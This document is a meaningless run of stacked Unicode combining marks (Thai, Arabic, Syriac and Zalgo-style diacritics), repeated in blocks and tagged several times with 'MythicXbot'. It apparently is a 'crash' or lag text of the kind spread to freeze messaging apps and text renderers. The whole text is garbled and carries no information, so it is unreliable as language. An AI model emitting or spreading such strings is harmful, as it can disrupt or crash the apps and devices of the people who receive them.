๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭৭৭৭৭৭*MythicXbot*๒๒๒๒๒๒๒๒*MythicXbot*৭৭৭৭৭৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ